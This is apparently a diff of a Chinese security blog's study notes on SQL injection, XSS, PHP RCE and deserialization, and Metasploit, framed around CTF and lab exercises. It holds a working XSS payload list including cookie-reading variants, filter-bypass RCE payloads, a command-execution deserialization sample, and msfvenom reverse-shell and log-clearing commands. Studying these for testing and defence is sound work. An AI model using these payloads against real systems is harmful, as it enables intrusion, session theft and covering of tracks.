class="comment">1&#x27;or&#x27;1&#x27;=&#x27;1</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -191,9 +380,6 @@
 <li>宽字节绕过</li>
 <li>HEX绕过</li>
 </ul>
-<h3 id="Access数据库处理"><a href="#Access数据库处理" class="headerlink" title="Access数据库处理"></a>Access数据库处理</h3><ul>
-<li>扫描到SAP乱码，下载到本地，将后缀名改为<code>.mdb</code></li>
-</ul>
 <h3 id="不使用逻辑运算符注入"><a href="#不使用逻辑运算符注入" class="headerlink" title="不使用逻辑运算符注入"></a>不使用逻辑运算符注入</h3><ul>
 <li>使用<code>order by</code>直接注入（用<code>1=1</code>、<code>1=2</code>测试注入点）</li>
 </ul>
@@ -218,16 +404,10 @@
 <li>test</li>
 <li>performance_schema（5.6之前手动）</li>
 </ul>
-<h3 id="MySQL表权限"><a href="#MySQL表权限" class="headerlink" title="MySQL表权限"></a>MySQL表权限</h3><ul>
-<li>增删改查、文件读写、排序查询索引</li>
+<h3 id="UDF提权条件"><a href="#UDF提权条件" class="headerlink" title="UDF提权条件"></a>UDF提权条件</h3><ul>
+<li>获得数据库账号，insert&#x2F;delete权限，以root为主</li>
+<li>拥有<code>udf.dll</code>写入目录的权限</li>
 </ul>
-<h3 id="MySQL渗透思路"><a href="#MySQL渗透思路" class="headerlink" title="MySQL渗透思路"></a>MySQL渗透思路</h3><ol>
-<li>端口、版本信息收集</li>
-<li>数据库管理信息收集</li>
-<li>暴力破解</li>
-<li>查看是否有源代码或文件包泄露漏洞</li>
-<li>使用phpMyAdmin账号获取webshell，或利用CMS漏洞获取webshell</li>
-</ol>
 <h3 id="MySQL常用payload"><a href="#MySQL常用payload" class="headerlink" title="MySQL常用payload"></a>MySQL常用payload</h3><p><a href="https://blog.csdn.net/qq_31343581/article/details/104661821">sql注入payload总结-CSDN博客</a></p>
 <h3 id="MySQL注入绕过技巧"><a href="#MySQL注入绕过技巧" class="headerlink" title="MySQL注入绕过技巧"></a>MySQL注入绕过技巧</h3><h4 id="1-空格绕过（注释符、-a0）"><a href="#1-空格绕过（注释符、-a0）" class="headerlink" title="1. 空格绕过（注释符、%a0）"></a>1. 空格绕过（注释符、%a0）</h4><ul>
 <li>两个空格代替一个空格</li>
@@ -314,15 +494,7 @@
 
 
 
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h3><ol>
-<li>使用安全API</li>
-<li>Escape</li>
-<li>白名单</li>
-<li>输入控制</li>
-<li>过滤、转换、替换、删除</li>
-<li>使用PDO</li>
-</ol>
-<h3 id="MySQL安全"><a href="#MySQL安全" class="headerlink" title="MySQL安全"></a>MySQL安全</h3><ul>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="MySQL安全"><a href="#MySQL安全" class="headerlink" title="MySQL安全"></a>MySQL安全</h3><ul>
 <li>账户权限安全</li>
 <li>数据网络安全</li>
 <li>密码策略安全</li>
@@ -332,6 +504,14 @@
 <li>安全启动项</li>
 <li>备份策略</li>
 </ul>
+<h3 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h3><ol>
+<li>使用安全API</li>
+<li>Escape</li>
+<li>白名单</li>
+<li>输入控制</li>
+<li>过滤、转换、替换、删除</li>
+<li>使用PDO</li>
+</ol>
 <h3 id="修复宽字节注入"><a href="#修复宽字节注入" class="headerlink" title="修复宽字节注入"></a>修复宽字节注入</h3><ul>
 <li>使用<code>set charcter_set_client=binary</code></li>
 <li>Windows：修改<code>my.ini</code></li>
@@ -376,9 +556,12 @@
 <h3 id="Redis与Windows"><a href="#Redis与Windows" class="headerlink" title="Redis与Windows"></a>Redis与Windows</h3><ul>
 <li>使用Telnet连接Redis，把木马写入启动项，写入mof使用魔法提权</li>
 </ul>
-<h3 id="UDF提权条件"><a href="#UDF提权条件" class="headerlink" title="UDF提权条件"></a>UDF提权条件</h3><ul>
-<li>获得数据库账号，insert&#x2F;delete权限，以root为主</li>
-<li>拥有<code>udf.dll</code>写入目录的权限</li>
+<br>
+
+
+
+<h1 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h1><h2 id="渗透-3"><a href="#渗透-3" class="headerlink" title="渗透"></a>渗透</h2><h3 id="数据库处理"><a href="#数据库处理" class="headerlink" title="数据库处理"></a>数据库处理</h3><ul>
+<li>扫描到SAP乱码，下载到本地，将后缀名改为<code>.mdb</code></li>
 </ul>
 ]]></content>
       <categories>
@@ -453,9 +636,26 @@
 <td align="center">否</td>
 </tr>
 </tbody></table>
-<h1 id="XSS漏洞演示"><a href="#XSS漏洞演示" class="headerlink" title="XSS漏洞演示"></a>XSS漏洞演示</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>这是xss-labs的level1，查看源代码可以知道，<strong>get传参name的值test插入到html里</strong>，那我们可以直接传入<code>name=&lt;script&gt;alert()&lt;/script&gt;</code></p>
-<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407191729288.png" alt="image-20240719172918254"></p>
-<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407191737856.png" alt="image-20240719173724829"></p>
+<h1 id="XSS漏洞演示"><a href="#XSS漏洞演示" class="headerlink" title="XSS漏洞演示"></a>XSS漏洞演示</h1><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>1、打开网站，看到选择语言的按钮，我们选择英语后页面的URL栏有回显</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407241630869.png" alt="image-20240724163043834"></p>
+<p>2、那我们直接在default后面加上我们的payload即可。</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407241632650.png" alt="image-20240724163231622"></p>
+<br>
+
+
+
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>直接在输入框输入payload即可</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407241634135.png" alt="image-20240724163445106"></p>
+<br>
+
+
+
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>直接在输入框输入payload</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407241636560.png" alt="image-20240724163630530"></p>
+<br>
+
+
+
 <h1 id="payload及绕过"><a href="#payload及绕过" class="headerlink" title="payload及绕过"></a>payload及绕过</h1><h2 id="一些常用的payload"><a href="#一些常用的payload" class="headerlink" title="一些常用的payload"></a>一些常用的payload</h2><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">参考：https://www.freebuf.com/articles/web/338123.html</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006C\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>       //Unicode码  还有十六进制 URL编码 JS编码 HTML实体编码等等</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="comment">/*dsa*/</span>(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   //绕过黑名单</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>(alert)(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>        //绕过黑名单</span></span><br><span class="line"><span class="language-xml">&lt;svg/onload=alert(1)&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>       //过滤 script时</span></span><br><span class="line"><span class="language-xml">&quot;&gt;&lt;svg/onload=alert(1)//</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>  <span class="attr">x</span>=<span class="string">&quot;&quot;</span>&gt;</span>   //过滤 script时</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1111)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>      //过滤 script时</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">””</span> <span class="attr">onmousemove</span>=<span class="string">prompt(document.cookie)</span> &gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;button&quot;</span>  <span class="attr">value</span> =<span class="string">&quot;clickme&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;click me&#x27;)&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">制表符 绕过滤器的</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;jav&amp;#x9ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">1.<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javas</span>	<span class="attr">cript:alert</span>(<span class="attr">1</span>)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //Tab</span></span><br><span class="line"><span class="language-xml">2.<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javas</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">cript:alert</span>(<span class="attr">1</span>)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //回车</span></span><br><span class="line"><span class="language-xml">3.<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javas</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">cript:alert</span>(<span class="attr">1</span>)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //换行</span></span><br><span class="line"><span class="language-xml">4.<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //编码冒号</span></span><br><span class="line"><span class="language-xml">5.<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javasc</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">ript:alert</span>(<span class="attr">1</span>)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //HTML5 新增的实体命名编码，IE6、7下不支持</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(1)</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%43%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%43%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">onerror=alert;<span class="keyword">throw</span> <span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><span class="template-variable">&#123;onerror=alert&#125;</span><span class="language-xml"><span class="language-javascript"><span class="keyword">throw</span> <span class="number">1337</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>         //过滤 单引号，双引号，小括号时   没过滤script</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1111)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&#x27; οnclick=alert(1111) &#x27;   //过滤&lt; &gt;时</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">http://www.<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)&lt;/script .com</span></span><br></pre></td></tr></table></figure>
 
 <p>更多的payload可以去<a href="https://github.com/payloadbox/xss-payload-list">payloadbox&#x2F;xss-payload-list: 🎯 Cross Site Scripting ( XSS ) Vulnerability Payload List (github.com)</a>查看</p>
@@ -1074,8 +1274,19 @@
 <br>
 
 <h3 id="dev-null-2-1类无回显"><a href="#dev-null-2-1类无回显" class="headerlink" title="&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显"></a>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显</h3><p>用分隔符进行分割即可绕过<br><code>http://127.0.0.1/?pay=ls||</code><br><br></p>
+<h2 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h2><p>利用PHP动态函数的特性，构造出字符串。</p>
+<p>POST传参：<code>$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\&quot;&#x27;</span>+tmp1+<span class="string">&#x27;\&quot;&#x27;</span>+<span class="string">&#x27;^&#x27;</span>+<span class="string">&#x27;\&quot;&#x27;</span>+tmp2+<span class="string">&#x27;\&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">#mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
 <h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><p>代码示例：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 显示文件内容</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 获取用户输入的代码</span></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="comment">// 如果输入包含字母或数字，则拒绝执行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行用户输入的代码</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<br>
 
 <h3 id="使用url取反绕过"><a href="#使用url取反绕过" class="headerlink" title="使用url取反绕过"></a>使用url取反绕过</h3><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;system&#x27;</span>); //<span class="meta">%8C</span><span class="meta">%86</span><span class="meta">%8C</span><span class="meta">%8B</span><span class="meta">%9A</span><span class="meta">%92</span></span><br><span class="line">echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">echo urlencode(~<span class="string">&#x27;cat /f*&#x27;</span>);  //<span class="meta">%9C</span><span class="meta">%9E</span><span class="meta">%8B</span><span class="meta">%DF</span><span class="meta">%D0</span><span class="meta">%99</span><span class="meta">%D5</span></span><br><span class="line">//(~<span class="meta">%8C</span><span class="meta">%86</span><span class="meta">%8C</span><span class="meta">%8B</span><span class="meta">%9A</span><span class="meta">%92</span>)(~<span class="meta">%9C</span><span class="meta">%9E</span><span class="meta">%8B</span><span class="meta">%DF</span><span class="meta">%D0</span><span class="meta">%99</span><span class="meta">%D5</span>)</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
 <br>
@@ -1107,6 +1318,10 @@
 <p>正则表达式<code>[^\W]+\((?R)?\)</code>解释:<br><code>[^\W]+</code>：<br>**方括号 [ ]**：定义一个字符类，匹配方括号中的任意字符。<br><strong>脱字符 ^</strong>：在字符类的开头表示取反，匹配不在字符类中的字符。<br><strong>\W</strong>：匹配任意非单词字符，相当于 <code>[^a-zA-Z0-9_]</code>。但因为脱字符 ^ 的存在，\W 被反转，因此匹配单词字符 <code>[a-zA-Z0-9_]</code>。<br><strong>+<strong>：量词，表示前面的元素（在这里是字符类）匹配一次或多次。<br>所以，</strong>[^\W]+ 实际上匹配一个或多个单词字符。</strong>  </p>
 <p><strong>(</strong>：紧接着匹配一个左括号 (<br>**(?R)?**：递归地匹配整个正则表达式（匹配一个嵌套的结构）。<br><strong>)</strong>：匹配一个右括号 )  </p>
 <p>举个例子：传递参数<code>a(b(c()));</code>，经过第一轮匹配还剩下<code>a(b());</code>，第二轮匹配后还剩下<code>a();</code>，第三轮匹配后还剩下<code>;</code>，符合正则表达式的要求，那么<code>a(b(c()));</code>可以执行。简而言之，无参数rce就是不使用参数，只使用一个个函数最终达到目的。</p>
+<br>
+
+
+
 <h3 id="相关函数介绍"><a href="#相关函数介绍" class="headerlink" title="相关函数介绍"></a>相关函数介绍</h3><p>scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）<br>localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）<br>current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西<br>getcwd() :取得当前工作目录<br>dirname():函数返回路径中的目录部分<br>array_flip() :交换数组中的键和值，成功时返回交换后的数组<br>array_rand() :从数组中随机取出一个或多个单元<br>array_reverse():将数组内容反转<br>strrev():用于反转给定字符串<br>getcwd()：获取当前工作目录路径<br>dirname() ：函数返回路径中的目录部分。<br>chdir() ：函数改变当前的目录。<br>eval()、assert()：命令执行<br>hightlight_file()、show_source()、readfile()：读取文件内容  </p>
 <p><strong>php数组操作函数</strong>：<br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>prev() - 将内部指针指向数组中的上一个元素，并输出。<br>current() - 返回数组中的当前元素的值。<br>end() - 将内部指针指向数组中的最后一个元素，并输出。<br>reset() - 将内部指针指向数组中的第一个元素，并输出。<br>each() - 返回当前元素的键名和键值，并将内部指针向前移动  </p>
 <p>利用这些函数，我们可以构造出无参数的 RCE payload。以<strong>查看当前目录下文件</strong>为例：</p>
@@ -1456,8 +1671,16 @@ https://blog.csdn.net/2301_76690905/article/details/134533626  ]]></content>
 <br>
 
 <h2 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h2><p>PHP原生类是指PHP语言中自带的类，这些类无需安装或导入任何库即可直接使用。常见的PHP原生类包括字符串操作类、数组操作类、日期时间操作类等。</p>
-<p>在CTF题目中，PHP原生类可以用于多种攻击手段，如XSS（跨站脚本）、SSRF（同源请求伪造）、XXE（XML外部实体注入）、反序列化和文件操作等。以下是一些具体的PHP原生类及其应用：<br><strong>Error 和 Exception 类</strong>：这些类可以用于绕过哈希比较和进行XSS攻击。<br><strong>SoapClient 类</strong>：这个类可以用于进行SSRF攻击。当_call方法被触发时，它可以发送HTTP和HTTPS请求。<br><strong>DirectoryIterator 和 GlobIterator 类</strong>：这些迭代器类可以用于遍历目录，进行敏感操作如读取文件。<br><strong>ZipArchive 类</strong>：这个类可以用于压缩和解压缩文件，如果设置了特定的参数，可以实现删除文件的功能。<br><strong>SimpleXMLElement 类</strong>：这个类可以用于解析 XML 文档中的元素<br><strong>注意：</strong>MD5 和 SHA1 函数可以对一个类进行hash，并且会触发该类的__toString方法。（比如说[极客大挑战 2020]greatphp）</p>
-<h3 id="使用-Error-Exception-内置类进行-XSS"><a href="#使用-Error-Exception-内置类进行-XSS" class="headerlink" title="使用 Error&#x2F;Exception 内置类进行 XSS"></a>使用 Error&#x2F;Exception 内置类进行 XSS</h3><br>
+<p>在CTF题目中，PHP原生类可以用于多种攻击手段，如XSS（跨站脚本）、SSRF（同源请求伪造）、XXE（XML外部实体注入）、反序列化和文件操作等。</p>
+<p>以下是一些具体的PHP原生类及其应用： </p>
+<p><strong>Error 和 Exception 类</strong>：这些类可以用于绕过哈希比较和进行XSS攻击。<br><strong>SoapClient 类</strong>：这个类可以用于进行SSRF攻击。当_call方法被触发时，它可以发送HTTP和HTTPS请求。<br><strong>ZipArchive 类</strong>：这个类可以用于压缩和解压缩文件，如果设置了特定的参数，可以实现删除文件的功能。<br><strong>SimpleXMLElement 类</strong>：这个类可以用于解析 XML 文档中的元素 </p>
+<p><mark style="background-color: #F4A460">可遍历目录类</mark>：</p>
+<p><strong>DirectoryIterator 类</strong><br><strong>FilesystemIterator 类</strong><br><strong>GlobIterator 类</strong></p>
+<p><mark style="background-color: #F4A460">可读取文件类</mark></p>
+<p><strong>SplFileObject类</strong></p>
+<p><strong>注意：</strong>MD5 和 SHA1 函数可以对一个类进行hash，并且会触发该类的__toString方法。（比如说[极客大挑战 2020]greatphp）</p>
+<p><em><strong>具体的使用</strong>可以看大佬文章：<a href="https://blog.csdn.net/cjdgg/article/details/115314651">PHP 原生类的利用_php原生类利用-CSDN博客</a></em></p>
+<br>
 
 <h2 id="php序列化–任意命令执行"><a href="#php序列化–任意命令执行" class="headerlink" title="php序列化–任意命令执行"></a>php序列化–任意命令执行</h2><p>漏洞代码示例：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);   <span class="comment">//当unserialize运行，wakeup方法会自动执行，从而实现命令执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -1599,7 +1822,7 @@ https://blog.csdn.net/2301_76690905/article/details/134533626  ]]></content>
       </tags>
   </entry>
   <entry>
-    <title>Metasploit</title>
+    <title>Metasploit基本使用</title>
     <url>/posts/1051313787.html</url>
     <content><![CDATA[<h2 id="Metasploit的免杀和基本使用"><a href="#Metasploit的免杀和基本使用" class="headerlink" title="Metasploit的免杀和基本使用"></a>Metasploit的免杀和基本使用</h2><p>1、在kali里打开Metasploit，创建payload，输入<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=*** lport=*** -f exe -o ***(保存的文件名字及后缀)</code></p>
 <span id="more"></span>
@@ -1680,7 +1903,7 @@ clearev                                                 #清除日志
